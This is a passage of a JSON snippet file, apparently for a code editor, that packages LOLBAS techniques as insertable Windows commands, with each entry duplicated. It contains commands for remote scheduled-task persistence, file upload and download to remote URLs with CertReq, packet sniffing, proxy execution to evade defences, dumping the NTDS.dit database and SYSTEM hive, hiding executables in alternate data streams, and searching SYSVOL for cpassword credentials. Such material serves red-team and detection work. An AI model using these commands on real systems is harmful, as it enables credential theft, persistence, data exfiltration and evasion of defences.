    "Schtasks.exe Create a remote task to run daily relative to the the time of creation (lolbas)": {
        "prefix": "Schtasks.exe",
        "body": [
            "Schtasks.exe is Schedule periodic tasks. it can Create a scheduled task on a remote computer for persistence/lateral movement, requires  privilege, category: Execute, it can be used for Create a remote task to run daily relative to the the time of creation.",
            "",
            "```sh",
            "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily${0}",
            "```"
        ],
        "description": "Schtasks.exe is Schedule periodic tasks. it can Create a scheduled task on a remote computer for persistence/lateral movement, requires  privilege, category: Execute, it can be used for Create a remote task to run daily relative to the the time of creation."
    },
    "lolbas Schtasks.exe Create a remote task to run daily relative to the the time of creation": {
        "prefix": "lolbas Schtasks.exe",
        "body": [
            "Schtasks.exe is Schedule periodic tasks. it can Create a scheduled task on a remote computer for persistence/lateral movement, requires  privilege, category: Execute, it can be used for Create a remote task to run daily relative to the the time of creation.",
            "",
            "```sh",
            "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily${0}",
            "```"
        ],
        "description": "Schtasks.exe is Schedule periodic tasks. it can Create a scheduled task on a remote computer for persistence/lateral movement, requires  privilege, category: Execute, it can be used for Create a remote task to run daily relative to the the time of creation."
    },
    "CertReq.exe Download file from Internet (lolbas)": {
        "prefix": "CertReq.exe",
        "body": [
            "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument)., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}${0}",
            "```"
        ],
        "description": "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument)., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas CertReq.exe Download file from Internet": {
        "prefix": "lolbas CertReq.exe",
        "body": [
            "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument)., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}${0}",
            "```"
        ],
        "description": "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument)., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "CertReq.exe Upload (lolbas)": {
        "prefix": "CertReq.exe",
        "body": [
            "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal., requires  privilege, category: Upload, it can be used for Upload.",
            "",
            "```sh",
            "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal., requires  privilege, category: Upload, it can be used for Upload."
    },
    "lolbas CertReq.exe Upload": {
        "prefix": "lolbas CertReq.exe",
        "body": [
            "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal., requires  privilege, category: Upload, it can be used for Upload.",
            "",
            "```sh",
            "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "CertReq.exe is Used for requesting and managing certificates. it can Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal., requires  privilege, category: Upload, it can be used for Upload."
    },
    "Pktmon.exe use this a built in network sniffer on windows 10 to capture senstive traffic (lolbas)": {
        "prefix": "Pktmon.exe",
        "body": [
            "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop, requires  privilege, category: Reconnaissance, it can be used for use this a built in network sniffer on windows 10 to capture senstive traffic.",
            "",
            "```sh",
            "pktmon.exe start --etw${0}",
            "```"
        ],
        "description": "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop, requires  privilege, category: Reconnaissance, it can be used for use this a built in network sniffer on windows 10 to capture senstive traffic."
    },
    "lolbas Pktmon.exe use this a built in network sniffer on windows 10 to capture senstive traffic": {
        "prefix": "lolbas Pktmon.exe",
        "body": [
            "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop, requires  privilege, category: Reconnaissance, it can be used for use this a built in network sniffer on windows 10 to capture senstive traffic.",
            "",
            "```sh",
            "pktmon.exe start --etw${0}",
            "```"
        ],
        "description": "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop, requires  privilege, category: Reconnaissance, it can be used for use this a built in network sniffer on windows 10 to capture senstive traffic."
    },
    "Pktmon.exe Look for interesting traffic such as telent or FTP (lolbas)": {
        "prefix": "Pktmon.exe",
        "body": [
            "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Select Desired ports for packet capture, requires  privilege, category: Reconnaissance, it can be used for Look for interesting traffic such as telent or FTP.",
            "",
            "```sh",
            "pktmon.exe filter add -p 445${0}",
            "```"
        ],
        "description": "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Select Desired ports for packet capture, requires  privilege, category: Reconnaissance, it can be used for Look for interesting traffic such as telent or FTP."
    },
    "lolbas Pktmon.exe Look for interesting traffic such as telent or FTP": {
        "prefix": "lolbas Pktmon.exe",
        "body": [
            "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Select Desired ports for packet capture, requires  privilege, category: Reconnaissance, it can be used for Look for interesting traffic such as telent or FTP.",
            "",
            "```sh",
            "pktmon.exe filter add -p 445${0}",
            "```"
        ],
        "description": "Pktmon.exe is Capture Network Packets on the windows 10 with October 2018 Update or later.. it can Select Desired ports for packet capture, requires  privilege, category: Reconnaissance, it can be used for Look for interesting traffic such as telent or FTP."
    },
    "Unregmp2.exe Proxy execution of binary (lolbas)": {
        "prefix": "Unregmp2.exe",
        "body": [
            "Unregmp2.exe is Microsoft Windows Media Player Setup Utility. it can Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\"${0}",
            "```"
        ],
        "description": "Unregmp2.exe is Microsoft Windows Media Player Setup Utility. it can Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "lolbas Unregmp2.exe Proxy execution of binary": {
        "prefix": "lolbas Unregmp2.exe",
        "body": [
            "Unregmp2.exe is Microsoft Windows Media Player Setup Utility. it can Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\"${0}",
            "```"
        ],
        "description": "Unregmp2.exe is Microsoft Windows Media Player Setup Utility. it can Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "Wlrmdr.exe Use wlrmdr as a proxy binary to evade defensive countermeasures (lolbas)": {
        "prefix": "Wlrmdr.exe",
        "body": [
            "Wlrmdr.exe is Windows Logon Reminder executable. it can Execute executable with wlrmdr.exe as parent process, requires  privilege, category: Execute, it can be used for Use wlrmdr as a proxy binary to evade defensive countermeasures.",
            "",
            "```sh",
            "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}${0}",
            "```"
        ],
        "description": "Wlrmdr.exe is Windows Logon Reminder executable. it can Execute executable with wlrmdr.exe as parent process, requires  privilege, category: Execute, it can be used for Use wlrmdr as a proxy binary to evade defensive countermeasures."
    },
    "lolbas Wlrmdr.exe Use wlrmdr as a proxy binary to evade defensive countermeasures": {
        "prefix": "lolbas Wlrmdr.exe",
        "body": [
            "Wlrmdr.exe is Windows Logon Reminder executable. it can Execute executable with wlrmdr.exe as parent process, requires  privilege, category: Execute, it can be used for Use wlrmdr as a proxy binary to evade defensive countermeasures.",
            "",
            "```sh",
            "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}${0}",
            "```"
        ],
        "description": "Wlrmdr.exe is Windows Logon Reminder executable. it can Execute executable with wlrmdr.exe as parent process, requires  privilege, category: Execute, it can be used for Use wlrmdr as a proxy binary to evade defensive countermeasures."
    },
    "wbadmin.exe Snapshoting of Active Directory NTDS.dit database (lolbas)": {
        "prefix": "wbadmin.exe",
        "body": [
            "wbadmin.exe is Windows Backup Administration utility. it can Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx), requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet${0}",
            "```"
        ],
        "description": "wbadmin.exe is Windows Backup Administration utility. it can Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx), requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database."
    },
    "lolbas wbadmin.exe Snapshoting of Active Directory NTDS.dit database": {
        "prefix": "lolbas wbadmin.exe",
        "body": [
            "wbadmin.exe is Windows Backup Administration utility. it can Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx), requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet${0}",
            "```"
        ],
        "description": "wbadmin.exe is Windows Backup Administration utility. it can Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx), requires  privilege, category: Dump, it can be used for Snapshoting of Active Directory NTDS.dit database."
    },
    "wbadmin.exe Dumping of Active Directory NTDS.dit database (lolbas)": {
        "prefix": "wbadmin.exe",
        "body": [
            "wbadmin.exe is Windows Backup Administration utility. it can Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers., requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet${0}",
            "```"
        ],
        "description": "wbadmin.exe is Windows Backup Administration utility. it can Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers., requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database."
    },
    "lolbas wbadmin.exe Dumping of Active Directory NTDS.dit database": {
        "prefix": "lolbas wbadmin.exe",
        "body": [
            "wbadmin.exe is Windows Backup Administration utility. it can Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers., requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database.",
            "",
            "```sh",
            "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet${0}",
            "```"
        ],
        "description": "wbadmin.exe is Windows Backup Administration utility. it can Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers., requires  privilege, category: Dump, it can be used for Dumping of Active Directory NTDS.dit database."
    },
    "Xwizard.exe Run a com object created in registry to evade defensive counter measures (lolbas)": {
        "prefix": "Xwizard.exe",
        "body": [
            "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds., requires  privilege, category: Execute, it can be used for Run a com object created in registry to evade defensive counter measures.",
            "",
            "```sh",
            "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}${0}",
            "```"
        ],
        "description": "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds., requires  privilege, category: Execute, it can be used for Run a com object created in registry to evade defensive counter measures."
    },
    "lolbas Xwizard.exe Run a com object created in registry to evade defensive counter measures": {
        "prefix": "lolbas Xwizard.exe",
        "body": [
            "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds., requires  privilege, category: Execute, it can be used for Run a com object created in registry to evade defensive counter measures.",
            "",
            "```sh",
            "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}${0}",
            "```"
        ],
        "description": "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds., requires  privilege, category: Execute, it can be used for Run a com object created in registry to evade defensive counter measures."
    },
    "Xwizard.exe Download file from Internet (lolbas)": {
        "prefix": "Xwizard.exe",
        "body": [
            "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}${0}",
            "```"
        ],
        "description": "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas Xwizard.exe Download file from Internet": {
        "prefix": "lolbas Xwizard.exe",
        "body": [
            "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}${0}",
            "```"
        ],
        "description": "Xwizard.exe is Execute custom class that has been added to the registry or download a file with Xwizard.exe. it can Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Findstr.exe Add a file to an alternate data stream to hide from defensive counter measures (lolbas)": {
        "prefix": "Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream to hide from defensive counter measures.",
            "",
            "```sh",
            "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream to hide from defensive counter measures."
    },
    "lolbas Findstr.exe Add a file to an alternate data stream to hide from defensive counter measures": {
        "prefix": "lolbas Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream to hide from defensive counter measures.",
            "",
            "```sh",
            "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream to hide from defensive counter measures."
    },
    "Findstr.exe Add a file to an alternate data stream from a webdav server to hide from defensive counter measures (lolbas)": {
        "prefix": "Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream from a webdav server to hide from defensive counter measures.",
            "",
            "```sh",
            "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream from a webdav server to hide from defensive counter measures."
    },
    "lolbas Findstr.exe Add a file to an alternate data stream from a webdav server to hide from defensive counter measures": {
        "prefix": "lolbas Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream from a webdav server to hide from defensive counter measures.",
            "",
            "```sh",
            "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file., requires  privilege, category: ADS, it can be used for Add a file to an alternate data stream from a webdav server to hide from defensive counter measures."
    },
    "Findstr.exe Find credentials stored in cpassword attrbute (lolbas)": {
        "prefix": "Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Search for stored password in Group Policy files stored on SYSVOL., requires  privilege, category: Credentials, it can be used for Find credentials stored in cpassword attrbute.",
            "",
            "```sh",
            "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Search for stored password in Group Policy files stored on SYSVOL., requires  privilege, category: Credentials, it can be used for Find credentials stored in cpassword attrbute."
    },
    "lolbas Findstr.exe Find credentials stored in cpassword attrbute": {
        "prefix": "lolbas Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Search for stored password in Group Policy files stored on SYSVOL., requires  privilege, category: Credentials, it can be used for Find credentials stored in cpassword attrbute.",
            "",
            "```sh",
            "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Search for stored password in Group Policy files stored on SYSVOL., requires  privilege, category: Credentials, it can be used for Find credentials stored in cpassword attrbute."
    },
    "Findstr.exe Download/Copy file from webdav server (lolbas)": {
        "prefix": "Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file., requires  privilege, category: Download, it can be used for Download/Copy file from webdav server.",
            "",
            "```sh",
            "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file., requires  privilege, category: Download, it can be used for Download/Copy file from webdav server."
    },
    "lolbas Findstr.exe Download/Copy file from webdav server": {
        "prefix": "lolbas Findstr.exe",
        "body": [
            "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file., requires  privilege, category: Download, it can be used for Download/Copy file from webdav server.",
            "",
            "```sh",
            "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Findstr.exe is Write to ADS, discover, or download files with Findstr.exe. it can Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file., requires  privilege, category: Download, it can be used for Download/Copy file from webdav server."
    },
    "Esentutl.exe Copies files from A to B (lolbas)": {
        "prefix": "Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source VBS file to the destination VBS file., requires  privilege, category: Copy, it can be used for Copies files from A to B.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source VBS file to the destination VBS file., requires  privilege, category: Copy, it can be used for Copies files from A to B."
    },
    "lolbas Esentutl.exe Copies files from A to B": {
        "prefix": "lolbas Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source VBS file to the destination VBS file., requires  privilege, category: Copy, it can be used for Copies files from A to B.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source VBS file to the destination VBS file., requires  privilege, category: Copy, it can be used for Copies files from A to B."
    },
    "Esentutl.exe Copy file and hide it in an alternate data stream as a defensive counter measure (lolbas)": {
        "prefix": "Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file., requires  privilege, category: ADS, it can be used for Copy file and hide it in an alternate data stream as a defensive counter measure.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file., requires  privilege, category: ADS, it can be used for Copy file and hide it in an alternate data stream as a defensive counter measure."
    },
    "lolbas Esentutl.exe Copy file and hide it in an alternate data stream as a defensive counter measure": {
        "prefix": "lolbas Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file., requires  privilege, category: ADS, it can be used for Copy file and hide it in an alternate data stream as a defensive counter measure.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file., requires  privilege, category: ADS, it can be used for Copy file and hide it in an alternate data stream as a defensive counter measure."
    },
    "Esentutl.exe Extract hidden file within alternate data streams (lolbas)": {
        "prefix": "Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source Alternate Data Stream (ADS) to the destination EXE., requires  privilege, category: ADS, it can be used for Extract hidden file within alternate data streams.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source Alternate Data Stream (ADS) to the destination EXE., requires  privilege, category: ADS, it can be used for Extract hidden file within alternate data streams."
    },
    "lolbas Esentutl.exe Extract hidden file within alternate data streams": {
        "prefix": "lolbas Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source Alternate Data Stream (ADS) to the destination EXE., requires  privilege, category: ADS, it can be used for Extract hidden file within alternate data streams.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source Alternate Data Stream (ADS) to the destination EXE., requires  privilege, category: ADS, it can be used for Extract hidden file within alternate data streams."
    },
    "Esentutl.exe Use to copy files from one unc path to another (lolbas)": {
        "prefix": "Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source EXE to the destination EXE file, requires  privilege, category: Download, it can be used for Use to copy files from one unc path to another.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source EXE to the destination EXE file, requires  privilege, category: Download, it can be used for Use to copy files from one unc path to another."
    },
    "lolbas Esentutl.exe Use to copy files from one unc path to another": {
        "prefix": "lolbas Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source EXE to the destination EXE file, requires  privilege, category: Download, it can be used for Use to copy files from one unc path to another.",
            "",
            "```sh",
            "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies the source EXE to the destination EXE file, requires  privilege, category: Download, it can be used for Use to copy files from one unc path to another."
    },
    "Esentutl.exe Copy/extract a locked file such as the AD Database (lolbas)": {
        "prefix": "Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies a (locked) file using Volume Shadow Copy, requires  privilege, category: Copy, it can be used for Copy/extract a locked file such as the AD Database.",
            "",
            "```sh",
            "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies a (locked) file using Volume Shadow Copy, requires  privilege, category: Copy, it can be used for Copy/extract a locked file such as the AD Database."
    },
    "lolbas Esentutl.exe Copy/extract a locked file such as the AD Database": {
        "prefix": "lolbas Esentutl.exe",
        "body": [
            "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies a (locked) file using Volume Shadow Copy, requires  privilege, category: Copy, it can be used for Copy/extract a locked file such as the AD Database.",
            "",
            "```sh",
            "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}${0}",
            "```"
        ],
        "description": "Esentutl.exe is Binary for working with Microsoft Joint Engine Technology (JET) database. it can Copies a (locked) file using Volume Shadow Copy, requires  privilege, category: Copy, it can be used for Copy/extract a locked file such as the AD Database."
    },
    "Cscript.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism (lolbas)": {
        "prefix": "Cscript.exe",
        "body": [
            "Cscript.exe is Binary used to execute scripts in Windows. it can Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs${0}",
            "```"
        ],
        "description": "Cscript.exe is Binary used to execute scripts in Windows. it can Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "lolbas Cscript.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism": {
        "prefix": "lolbas Cscript.exe",
        "body": [
